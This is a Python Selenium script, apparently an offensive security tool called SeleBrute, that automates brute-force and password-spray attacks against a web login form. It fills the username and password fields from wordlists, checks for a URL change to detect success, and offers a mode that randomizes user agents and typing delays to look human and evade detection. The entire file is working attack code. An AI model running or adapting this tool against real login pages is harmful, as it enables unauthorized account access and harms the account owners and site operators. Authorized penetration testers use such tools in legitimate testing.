#!/usr/bin/env python3

import time
import argparse
import sys
import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from fake_useragent import UserAgent

class C:
    RED, GREEN, YELLOW, LIGHT_BLUE, CYAN, BOLD, END = '\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[96m', '\033[1m', '\033[0m'    

def print_banner():
    """Prints the tool's banner."""
    banner = rf"""
{C.RED}  _________      .__        __________                __          
 /   _____/ ____ |  |   ____\______   \_______ __ ___/  |_  ____  
 \_____  \_/ __ \|  | _/ __ \|    |  _/\_  __ \  |  \   __\/ __ \ 
 /        \  ___/|  |_\  ___/|    |   \ |  | \/  |  /|  | \  ___/ 
/_______  /\___  >____/\___  >______  / |__|  |____/ |__|  \___  >
        \/     \/          \/       \/                         \/ 
{C.END}
  {C.BOLD}{C.YELLOW}>> [A WebDriver-based Authentication Toolkit] <<{C.END}
  {C.BOLD}{C.YELLOW}     >> [By {C.END}{C.BOLD}{C.RED}tpazz {C.END}{C.BOLD}{C.YELLOW}-{C.END}{C.BOLD}{C.GREEN} Green Lemon Company{C.END}{C.BOLD}{C.YELLOW}] << {C.END}
"""
    print(banner)

def parse_args():
    """Parses command-line arguments."""
    parser = argparse.ArgumentParser(
        description="~ Selenium script to brute force or password spray a login form ~"
    )
    parser.add_argument("--url", required=True, help="URL of the login page")
    parser.add_argument("--username", help="[Brute Force] Single username to attack.")
    parser.add_argument("--passwords-file", help="[Brute Force] Path to file containing a list of passwords.")
    parser.add_argument("--usernames-file", help="[Password Spray] Path to file containing a list of usernames.")
    parser.add_argument("--password", help="[Password Spray] Single password to try against all usernames.")
    parser.add_argument("--browser", default="chrome", choices=["chrome", "firefox"], help="Browser driver to use (default: chrome)")
    parser.add_argument("--driver-path", default=None, help="Path to the WebDriver if it's not in your PATH")
    parser.add_argument("--browser-path", default=None, help="Path to the browser binary (e.g., firefox.exe)")
    parser.add_argument("--max-attempts", type=int, default=0, help="Maximum number of password attempts to try (0 means no limit)")
    parser.add_argument("--headless", action="store_true", help="Run the browser in headless mode")
    parser.add_argument("--simulate-user", action="store_true", help="Enables realistic user simulation (slower).")
    parser.add_argument("--username-locator-strategy", required=True, choices=["id", "name", "xpath"], help="Locator strategy for the username field")
    parser.add_argument("--username-locator-value", required=True, help="Locator value for the username field")
    parser.add_argument("--password-locator-strategy", required=True, choices=["id", "name", "xpath"], help="Locator strategy for the password field")
    parser.add_argument("--password-locator-value", required=True, help="Locator value for the password field")
    parser.add_argument("--loginbutton-locator-strategy", required=True, choices=["id", "name", "xpath"], help="Locator strategy for the login button")
    parser.add_argument("--loginbutton-locator-value", required=True, help="Locator value for the login button")
    return parser.parse_args()

def slow_type(element, text):
    """Simulates realistic typing by entering text character by character."""
    for character in text:
        element.send_keys(character)
        time.sleep(random.uniform(0.05, 0.15))

def get_by_locator(strategy, value):
    """Converts strategy and value into a Selenium By locator tuple."""
    strategy = strategy.lower()
    if strategy == "id": return (By.ID, value)
    elif strategy == "name": return (By.NAME, value)
    elif strategy == "xpath": return (By.XPATH, value)
    else: raise ValueError(f"Unsupported locator strategy: {strategy}")

def create_webdriver(browser, driver_path=None, headless=False, browser_path=None, simulate_user=False):
    """Creates and configures a Selenium WebDriver instance."""
    if browser == "chrome":
        options = webdriver.ChromeOptions()
        if headless: options.add_argument("--headless")
        if simulate_user:
            try:
                ua = UserAgent()
                random_user_agent = ua.random
                options.add_argument(f'user-agent={random_user_agent}')
            except Exception:
                # Fallback to a generic user agent if the library fails (e.g., network issue)
                options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36')
        
        options.add_argument("--log-level=3")
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        service = ChromeService(executable_path=driver_path) if driver_path else ChromeService()
        driver = webdriver.Chrome(service=service, options=options)
    elif browser == "firefox":
        options = webdriver.FirefoxOptions()
        if headless: options.add_argument("--headless")
        if browser_path: options.binary_location = browser_path
        service = FirefoxService(executable_path=driver_path) if driver_path else FirefoxService()
        driver = webdriver.Firefox(service=service, options=options)
    else:
        raise ValueError("Unsupported browser specified.")
    return driver

def main():
    print_banner()
    args = parse_args()
    is_brute_force = args.username and args.passwords_file
    is_password_spray = args.usernames_file and args.password

    if not (is_brute_force or is_password_spray) or (is_brute_force and is_password_spray):
        sys.exit("Error: Invalid arguments. Specify either (--username and --passwords-file) OR (--usernames-file and --password).")

    attack_list = []
    try:
        if is_brute_force:
            with open(args.passwords_file, "r", encoding="latin-1", errors="ignore") as f:
                passwords = [line.strip() for line in f if line.strip()]
            for p in passwords: attack_list.append((args.username, p))
        else:
            with open(args.usernames_file, "r", encoding="latin-1", errors="ignore") as f:
                usernames = [line.strip() for line in f if line.strip()]
            for u in usernames: attack_list.append((u, args.password))
    except FileNotFoundError as e:
        sys.exit(f"Error: File not found - {e.filename}")

    if args.max_attempts > 0:
        attack_list = attack_list[:args.max_attempts]

    driver = create_webdriver(args.browser, args.driver_path, args.headless, args.browser_path, args.simulate_user)
    if args.simulate_user: driver.set_window_size(1920, 1080)
    else: driver.maximize_window()
        
    username_locator = get_by_locator(args.username_locator_strategy, args.username_locator_value)
    password_locator = get_by_locator(args.password_locator_strategy, args.password_locator_value)
    loginbutton_locator = get_by_locator(args.loginbutton_locator_strategy, args.loginbutton_locator_value)
    initial_url = args.url
    found_credentials = False

    try:
        driver.get(initial_url)
        initial_url = driver.current_url # Capture the URL after any initial redirects

        for idx, (user, pwd) in enumerate(attack_list, start=1):
            if args.simulate_user and idx > 1:
                time.sleep(random.uniform(1, 2))
            
            sys.stdout.write('\r' + ' ' * 80)
            sys.stdout.write(f"\r[{idx}/{len(attack_list)}] Trying: {user}:{pwd}")
            sys.stdout.flush()

            username_field = WebDriverWait(driver, 10).until(EC.element_to_be_clickable(username_locator))
            password_field = driver.find_element(*password_locator)
            
            username_field.clear()
            password_field.clear()

            if args.simulate_user:
                slow_type(username_field, user)
                slow_type(password_field, pwd)
            else:
                username_field.send_keys(user)
                password_field.send_keys(pwd)

            login_button = driver.find_element(*loginbutton_locator)

            if args.simulate_user:
                time.sleep(random.uniform(0.2, 0.5))
                ActionChains(driver).move_to_element(login_button).click().perform()
            else:
                login_button.click()
            
            # In simulate mode, use a patient wait for navigation. Otherwise, use a faster readyState check.
            if args.simulate_user:
                try:
                    WebDriverWait(driver, 5).until(EC.url_changes(initial_url))
                except TimeoutException:
                    pass # URL did not change, which is expected for a failed login.
            else:
                WebDriverWait(driver, 10).until(lambda d: d.execute_script("return document.readyState") == "complete")
            
            if driver.current_url != initial_url:
                print(f"\n\n{C.BOLD}{C.GREEN}[+] SUCCESS! Credentials found: {user}:{pwd}{C.END}")
                found_credentials = True
                break
            else:
                driver.get(initial_url) # Reload the page to ensure a clean state for the next attempt.

        if not found_credentials:
            print(f"\n\n{C.BOLD}{C.YELLOW}[-] Process finished. No credentials found.{C.END}\n")

    finally:
        driver.quit()

if __name__ == "__main__":
    main()